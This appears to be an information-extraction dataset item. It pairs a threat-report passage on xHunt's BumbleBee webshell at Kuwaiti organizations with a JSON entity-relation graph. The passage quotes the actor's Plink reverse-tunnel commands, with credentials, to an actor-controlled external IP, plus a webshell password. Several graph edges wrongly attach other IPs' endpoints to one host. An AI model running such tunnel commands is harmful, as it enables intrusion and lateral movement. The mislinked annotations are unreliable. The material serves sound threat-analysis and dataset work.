@@ -1,0 +1,76 @@
+
+
+
+Sentence : File Uploader and SSH Tunnels
+6/18
+During our research, we found a second BumbleBee webshell that was hosted on an internal IIS web
+server at the initial Kuwaiti organization, as well as on internal IIS web servers at two other Kuwaiti
+organizations. This BumbleBee webshell had different passwords to view and run commands
+compared to the first sample we analyzed. The second BumbleBee webshell required the actor to
+include the password TshuYoOARg3fndI within a URL parameter aptly named parameter. As with
+the initial BumbleBee sample, we do not know the password the actor must include to be able to run
+commands on the webshell.
+By analyzing artifacts on the internal IIS web server, we were able to determine that on July 16,
+2020, the actor ran similar commands to create SSH tunnels using Plink as those seen in Table 2 in
+the Appendix. We determined the actor executed commands that use the same username and
+password as seen in the xHunt cheat sheet, but with a different external IP address controlled by the
+actor, as in the following:
+1.exe 142.11.211[.]79 -C -R 0.0.0.0:8080:10.x.x.x:80 -l bor -pw 123321 -P 443
+SVROOT.exe 142.11.211[.]79 -C -R 0.0.0.0:8081:10.x.x.x:80 -l bor -pw 123321 -P 443
+These commands differ from those used to create the SSH tunnel on the compromised Exchange
+server that allowed the actor to connect to the server using RDP over TCP port 3389. The commands
+above attempt to create a tunnel to allow the actor to access web servers hosted at other internal
+servers over TCP port 80. We believe the actor used these SSH tunnels to gain access to web servers
+on other internal networks with hopes of finding similar file uploading functionality on those
+servers. If found, we believe the actor would use the file uploading functionality to upload a webshell
+to compromise the remote server for lateral movement.
+We checked the IIS logs that contained BumbleBee webshell activity and found three external IP
+addresses within the URLs of the referrer field of inbound HTTP requests. The presence of these IP
+addresses in the referrer field suggests that the actor used the SSH tunnels to access the web servers
+by including the following IP and TCP ports in the URL field of their browser:
+142.11.211[.]79:8080
+142.11.211[.]79:8081
+91.92.109[.]59:1234
+91.92.109[.]59:1255
+91.92.109[.]59:1288
+91.92.109[.]59:1289
+192.119.110[.]194:8083
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "BumbleBee webshell", "type" : "EXEF"},
+        {"id": 2, "description": "internal IIS web server at the initial Kuwaiti organization", "type" : "SYSP"},
+        {"id": 3, "description": "internal IIS web servers at two other Kuwaiti organizations", "type" : "SYSP"},
+        {"id": 4, "description": "password TshuYoOARg3fndI", "type" : "REGI"},
+        {"id": 5, "description": "Plink", "type" : "EXEF"},
+        {"id": 6, "description": "142.11.211[.]79", "type" : "CCSH"},
+        {"id": 7, "description": "10.x.x.x:80", "type" : "NETP"},
+        {"id": 8, "description": "bor", "type" : "REGI"},
+        {"id": 9, "description": "123321", "type" : "REGI"},
+        {"id": 10, "description": "compromised Exchange server", "type" : "SYSP"},
+        {"id": 11, "description": "RDP over TCP port 3389", "type" : "NETP"},
+        {"id": 12, "description": "142.11.211[.]79:8080", "type" : "CCSH"},
+        {"id": 13, "description": "142.11.211[.]79:8081", "type" : "CCSH"},
+        {"id": 14, "description": "91.92.109[.]59:1234", "type" : "CCSH"},
+        {"id": 15, "description": "91.92.109[.]59:1255", "type" : "CCSH"},
+        {"id": 16, "description": "91.92.109[.]59:1288", "type" : "CCSH"},
+        {"id": 17, "description": "91.92.109[.]59:1289", "type" : "CCSH"},
+        {"id": 18, "description": "192.119.110[.]194:8083", "type" : "CCSH"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "hosted on"},
+        {"source": 1, "target": 3, "rel_name" : "hosted on"},
+        {"source": 5, "target": 6, "rel_name" : "used to connect to"},
+        {"source": 5, "target": 7, "rel_name" : "tunnelled through"},
+        {"source": 5, "target": 8, "rel_name" : "uses username"},
+        {"source": 5, "target": 9, "rel_name" : "uses password"},
+        {"source": 10, "target": 11, "rel_name" : "allows connection via"},
+        {"source": 6, "target": 12, "rel_name" : "tunnel endpoint"},
+        {"source": 6, "target": 13, "rel_name" : "tunnel endpoint"},
+        {"source": 6, "target": 14, "rel_name" : "tunnel endpoint"},
+        {"source": 6, "target": 15, "rel_name" : "tunnel endpoint"},
+        {"source": 6, "target": 16, "rel_name" : "tunnel endpoint"},
+        {"source": 6, "target": 17, "rel_name" : "tunnel endpoint"},
+        {"source": 6, "target": 18, "rel_name" : "tunnel endpoint"}
+    ]
+}
